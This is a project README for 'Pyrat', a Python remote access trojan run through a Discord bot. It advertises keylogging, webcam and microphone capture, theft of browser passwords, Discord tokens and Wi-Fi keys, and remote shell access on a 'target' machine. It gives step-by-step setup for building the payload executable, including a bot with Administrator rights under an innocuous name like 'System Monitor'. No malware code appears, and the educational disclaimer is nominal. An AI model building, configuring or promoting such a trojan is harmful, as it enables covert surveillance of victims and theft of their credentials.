# Pyrat: Advanced Python Remote Access Trojan

![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge)
![License](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)

Pyrat is a comprehensive Remote Access Trojan built in Python, designed to offer a wide array of remote management and surveillance capabilities through a Discord bot interface. This project combines features from various popular open-source RATs, while adding unique functions, enhancements, and critical bug fixes.

> im not a skid :)

---

> ## Disclaimer
>
> This software is provided for educational and ethical research purposes only. The creator does not condone and is not responsible for any malicious or illegal use of this tool. By using this software, you agree to take full responsibility for your actions.

## Key Features

The project is controlled via a graphical builder which compiles a fully customized executable payload.

#### Surveillance & Data Extraction
- **Live Keylogger**: Capture all keystrokes and save them to a log file.
- **Screenshot**: Take a high-resolution screenshot of the target's entire screen.
- **Webcam Capture**: Take a picture from a specified webcam.
- **Microphone Recording**: Record audio from the microphone for a set duration.
- **Clipboard Extraction**: Scrape and view the current content of the clipboard.
- **Browser Data**: Extract saved passwords, browser history, and Discord tokens from all major browsers.
- **Wi-Fi Passwords**: Retrieve all saved Wi-Fi network profiles and their passwords.

#### System & File Management
- **File Explorer**: List files and directories, download/upload files, open files, and delete files.
- **Process Manager**: List all running processes and terminate them by name or PID.
- **Shell Access**: Execute shell commands and view the output directly in Discord.
- **System Information**: Get a detailed overview of the target's hardware, OS, and network configuration.
- **Power Control**: Remotely shut down, restart, lock, or log off the user.

#### Remote Interaction
- **Message Box**: Display a custom message box (Information, Warning, or Error) on the target's screen.
- **Text-to-Speech**: Make the target machine speak a custom message aloud.
- **Open URL**: Force the target's default browser to open a specified URL.
- **Change Wallpaper**: Change the desktop wallpaper from an image URL or attachment.

## Setup & Installation

Follow these steps to set up the builder and create your R.A.T.

### 1. Clone the Repository

Open a command prompt or terminal and run the following command:

```
git clone https://github.com/potatokingz/pyrat.git
```
Navigate into the newly created directory:
```
cd pyrat
```

### 2. Run the Setup Script

Simply double-click the `setup.cmd` file. This script will automatically perform the following actions:
- Verify that Python is installed and added to your system's PATH. If not, it will download and install it for you.
- Install all required Python libraries from `requirements.txt`.
- Launch the Pyrat Builder GUI.

---

## Configuration Tutorial

To use the builder, you need a **Discord Bot Token** and a **Category ID**. Here is how to get them.

### Part 1: Getting the Discord Bot Token

1.  **Create an Application**:
    - Go to the [Discord Developer Portal](https://discord.com/developers/applications).
    - Click **New Application** and give it a name (e.g., "System Monitor").

2.  **Create a Bot**:
    - In the left-hand menu, go to the **Bot** tab.
    - Click **Add Bot**, then **Yes, do it!**

3.  **Enable Privileged Intents**:
    - This step is **mandatory**.
    - On the **Bot** page, scroll down and enable all three **Privileged Gateway Intents**:
      - `PRESENCE INTENT`
      - `SERVER MEMBERS INTENT`
      - `MESSAGE CONTENT INTENT`

4.  **Get the Token**:
    - At the top of the **Bot** page, click **Reset Token**, then **Yes, do it!**
    - Click **Copy** to copy your bot's token. This is the value you will paste into the builder.

5.  **Invite the Bot to Your Server**:
    - In the left-hand menu, go to **OAuth2 -> URL Generator**.
    - In the "Scopes" box, check **bot** and **applications.commands**.
    - In the "Bot Permissions" box that appears, check **Administrator**.
    - Copy the generated URL at the bottom, paste it into your browser, and invite the bot to a server you control.

### Part 2: Getting the Category ID

1.  **Enable Developer Mode in Discord**:
    - Open Discord, go to **User Settings -> Advanced**.
    - Turn on **Developer Mode**.

2.  **Copy the Category ID**:
    - In your Discord server, right-click on the name of the category where you want the bot to create new session channels.
    - Click **Copy Category ID**. This is the value you will paste into the builder.

## Usage

After completing the setup, reopen the setup.cmd 

> Fill in the required fields, customize the theme and icon if you want, and click **Build Pyrat**. The compiled payload will be located in the `dist` folder.

## Credits

This project is a synthesis of concepts and features found in various open-source Python RATs, including but not limited to PySilon. Full credit is given to the original developers and contributors of those projects.
